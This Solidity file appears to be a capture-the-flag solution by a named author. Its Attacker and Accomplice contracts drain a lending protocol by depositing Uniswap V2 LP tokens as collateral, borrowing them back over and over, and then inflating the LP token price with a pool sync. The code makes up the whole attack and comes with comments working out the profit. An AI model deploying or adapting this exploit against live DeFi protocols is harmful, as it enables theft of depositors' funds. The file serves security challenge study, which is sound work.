// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity ^0.8.15;

import "forge-std/console.sol";
import {ERC20} from "./ERC20.sol";
import {IUniswapV2Pair} from "./IUniswapV2.sol";
import {LendingProtocol} from "./LendingProtocol.sol";
import {SqrtMath} from "./SqrtMath.sol";

/// @title Attacker
/// @author Christoph Michel <cmichel.io>
contract Attacker {
    Accomplice public debtTaker;
    IUniswapV2Pair public immutable pair; // token0 <> token1 uniswapv2 pair
    ERC20 public immutable ctf; // token0
    ERC20 public immutable usd; // token1
    LendingProtocol public immutable lending;

    constructor(
        ERC20 _ctf,
        ERC20 _usd,
        IUniswapV2Pair _pair,
        LendingProtocol _lending
    ) {
        ctf = _ctf;
        usd = _usd;
        pair = _pair;
        lending = _lending;
    }

    function _leveragePairDeposits() internal {
        // console.log(
        //     "_leveragePairDeposits:",
        //     pair.balanceOf(address(this)),
        //     debtTaker.remainingPairAmountToBorrow()
        // );
        // deposit initial LP
        lending.deposit(
            address(this),
            address(pair),
            pair.balanceOf(address(this))
        );
        // kick off borrowing
        debtTaker.keepBorrowing();
    }

    /// @dev called by Accomplice.keepBorrowing unless remainingPairAmountToBorrow is zero (maxPairValueToBorrow borrowed)
    function keepBorrowingCallback() external {
        _leveragePairDeposits();
    }

    function attack() external {
        /** USD per CTF price: 1000.0  LP reserves: 1_000 USD, 1 CTF  Attacker: 10_000.0 USD 10.0 CTF
            get LP tokens for (100.0 USD, 0.1 CTF) => LP value will be 200.0 USD
            Our total token value is roughly 10k USD + 10k USD in CTF = 20k$
            we need to deposit X$ as collateral to borrow and get X$ of LP token position in our second account
            (ignoring pool increase due to minting LP - this can be kept low by minting less and increasing borrow recursions)
            Then we can dump (20k - X)$ to the pool to increase the price of our LP token
            => our value will be X * LP_multiplier(20k - X) where LP_multiplier(Y) = 1 + Y / initialPoolValue = 1 + Y / 2000
            X * [1 + (20k-X) / 2000] = X + (20kX - X^2) / 2000
            max is at x = 11k => we'd get about 11k * LP_multiplier(9k) = 60.5k
         */
        // deposit everything
        usd.approve(address(lending), type(uint256).max);
        ctf.approve(address(lending), type(uint256).max);
        pair.approve(address(lending), type(uint256).max);
        usd.approve(address(pair), type(uint256).max);
        ctf.approve(address(pair), type(uint256).max);

        // mint LP. keep the mint value as low as possible such that we don't fail with a stackoverflow due to recursive borrowing
        uint256 lpHalfMintValue = 100e18;
        usd.transfer(address(pair), lpHalfMintValue);
        ctf.transfer(address(pair), lpHalfMintValue / 1e3);
        pair.mint(address(this));

        // console.log("LP balance:", pair.balanceOf(address(this)));
        uint256 maxPairValueToBorrow = 11_000e18;
        debtTaker = new Accomplice(maxPairValueToBorrow);
        // increasing LP price is most effective if done in a balanced amount => also send away balanced amount here
        // (not sure if optimal, especially as we increase USDC of lending pool which we later need to borrow again to satisfy win condition)
        usd.transfer(address(debtTaker), maxPairValueToBorrow / 2); // ~half maxPairValueToBorrow $
        ctf.transfer(address(debtTaker), maxPairValueToBorrow / 2000); // ~half maxPairValueToBorrow $
        debtTaker.depositCollateral();
        // recursively borrow more and more LP tokens by 1) attacker deposits pair
        // 2) accomplice (debtTaker) borrows pair, sends it back to attacker
        _leveragePairDeposits();

        // deposit what's left to the uniswap pair to increase LP price
        usd.transfer(address(pair), usd.balanceOf(address(this)));
        ctf.transfer(address(pair), ctf.balanceOf(address(this)));
        // (uint256 r0, uint256 r1, ) = IUniswapV2Pair(pair).getReserves();
        // console.log("Reserve USD", r1);
        pair.sync();
        // (, r1, ) = IUniswapV2Pair(pair).getReserves();
        // console.log("Reserve USD after sync", r1);

        lending.borrow(address(usd), usd.balanceOf(address(lending)));
    }
}

contract Accomplice {
    Attacker internal immutable attacker;
    LendingProtocol internal immutable lending;
    IUniswapV2Pair internal immutable pair;
    uint256 public remainingPairAmountToBorrow;

    constructor(uint256 maxPairValueToBorrow) payable {
        attacker = Attacker(msg.sender);
        lending = attacker.lending();
        pair = attacker.pair();
        remainingPairAmountToBorrow = (maxPairValueToBorrow << 112) / _getPairPrice();
    }

    function depositCollateral() external payable {
        ERC20 usd = attacker.usd();
        ERC20 ctf = attacker.ctf();
        usd.approve(address(lending), type(uint256).max);
        ctf.approve(address(lending), type(uint256).max);
        lending.deposit(
            address(this),
            address(usd),
            usd.balanceOf(address(this))
        );
        lending.deposit(
            address(this),
            address(ctf),
            ctf.balanceOf(address(this))
        );
    }

    function keepBorrowing() external payable {
        if (remainingPairAmountToBorrow == 0) return;

        uint256 pairInLending = pair.balanceOf(address(lending));
        uint256 pairToBorrow = remainingPairAmountToBorrow < pairInLending
            ? remainingPairAmountToBorrow
            : pairInLending;
        lending.borrow(address(pair), pairToBorrow);
        pair.transfer(address(attacker), pair.balanceOf(address(this)));
        remainingPairAmountToBorrow -= pairToBorrow;

        // trigger another round of leveraging pair borrows & deposits
        attacker.keepBorrowingCallback();
    }

    function _getPairPrice() public view returns (uint256) {
        uint256 totalSupply = IUniswapV2Pair(pair).totalSupply();
        (uint256 r0, uint256 r1, ) = IUniswapV2Pair(pair).getReserves();
        uint256 sqrtK = (SqrtMath.sqrt(r0 * r1) << 112) / totalSupply; // in 2**112
        uint256 priceCtf = 1_000 << 112; // in 2**112

        // fair lp price = 2 * sqrtK * sqrt(priceCtf * priceUsd) = 2 * sqrtK * sqrt(priceCtf)
        // sqrtK is in 2**112 and sqrt(priceCtf) is in 2**56. divide by 2**56 to return result in 2**112
        return (sqrtK * 2 * SqrtMath.sqrt(priceCtf)) / 2**56;
    }
}
